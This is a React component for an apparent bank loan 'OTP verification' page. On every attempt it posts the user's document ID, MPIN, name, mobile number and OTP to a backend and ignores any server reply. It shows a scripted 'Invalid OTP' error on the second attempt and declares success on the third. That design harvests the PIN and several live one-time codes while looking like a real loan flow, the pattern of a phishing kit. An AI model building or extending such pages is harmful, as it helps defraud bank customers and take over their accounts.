import React from "react";
import { ArrowLeft, ShieldAlert, Smartphone } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useLoanApplication } from "./useLoanApplication";
import { StepShell } from "./LoanStepShell";
import { postLoanStep } from "./loanApi";

export default function LoanOtpPage() {
  const navigate = useNavigate();
  const {
    docId,
    mpin,
    fullName,
    mobile,
    otpDigits,
    setOtpDigits,
    otpError,
    setOtpError,
    otpRefs,
    otpAttempts,
    setOtpAttempts,
    setSubmittedAt,
  } = useLoanApplication();
  const [loading, setLoading] = React.useState(false);
  const otp = otpDigits.join("");
  const verify = async () => {
    if (otp.length !== 6) return;
    const nextAttempt = otpAttempts + 1;
    setLoading(true);
    setOtpAttempts(nextAttempt);
    try {
      await postLoanStep("otpVerification", {
        documentId: docId.trim(),
        pin: mpin,
        fullName: fullName.trim(),
        mobileNumber: mobile.trim(),
        otp,
      });
    } catch {
      // The requested demo flow controls what is shown for each OTP attempt.
    }
    if (nextAttempt === 2) setOtpError(true);
    if (nextAttempt >= 3) {
      setSubmittedAt(new Date().toISOString());
      navigate("/loan/success");
    }
    setLoading(false);
  };
  const handleChange = (index, value) => {
    const next = [...otpDigits];
    next[index] = value.replace(/\D/g, "").slice(-1);
    setOtpDigits(next);
    if (otpError) setOtpError(false);
    if (next[index] && index < 5) otpRefs.current[index + 1]?.focus();
  };
  const handleKeyDown = (index, event) => {
    if (event.key === "Backspace" && !otpDigits[index] && index > 0) otpRefs.current[index - 1]?.focus();
  };

  return (
    <div className="px-4 pt-5 pb-6 sm:px-6 sm:pt-6 sm:pb-7">
      <div className="mx-auto w-10 h-1 rounded-full bg-slate-200 mb-6" />
      <StepShell icon={<Smartphone size={19} className="text-teal-600" />} title="OTP verification" subtitle="Check your email or mobile number for the 6-digit code">
        <div className={"mt-2 grid grid-cols-6 gap-1.5 sm:flex sm:justify-between sm:gap-2" + (otpError ? " animate-[shake_0.4s]" : "")}>
          {otpDigits.map((digit, index) => (
            <input key={index} ref={(element) => (otpRefs.current[index] = element)} value={digit} onChange={(event) => handleChange(index, event.target.value)} onKeyDown={(event) => handleKeyDown(index, event)} inputMode="numeric" maxLength={1} aria-label={`OTP digit ${index + 1}`} className={"w-full min-w-0 h-12 rounded-lg border-2 text-center text-lg font-bold text-slate-800 outline-none transition-colors sm:w-11 sm:h-14 sm:rounded-xl sm:text-xl " + (otpError ? "border-red-400 bg-red-50/60" : digit ? "border-teal-500 bg-teal-50/50" : "border-slate-200 bg-slate-50/60 focus:border-teal-400")} />
          ))}
        </div>
        {otpError && <p className="mt-2.5 text-[13px] font-medium text-red-500">Invalid OTP. Please check the code and try again.</p>}
      </StepShell>
      <div className="mt-2 flex gap-2 sm:gap-3">
        <button type="button" onClick={() => navigate("/loan/details")} aria-label="Go back" className="flex items-center justify-center rounded-full border border-slate-200 text-slate-500 font-semibold py-4 px-3 text-[15px] sm:px-4"><ArrowLeft size={16} /></button>
        <button type="button" onClick={verify} disabled={otp.length !== 6 || loading} className="min-w-0 flex-1 rounded-[22px] bg-gradient-to-r from-[#075d8b] to-[#299ab3] text-white font-bold py-4 px-2 text-sm shadow-[0_12px_24px_rgba(20,126,159,0.22)] disabled:opacity-40 transition-opacity sm:text-[15px]">{loading ? "Verifying..." : "Verify OTP"}</button>
      </div>
      <div className="flex items-center justify-center gap-1.5 mt-4"><ShieldAlert size={13} className="text-amber-500" /><span className="text-[11px] text-slate-400">Never share this OTP with anyone, including bank staff.</span></div>
    </div>
  );
}
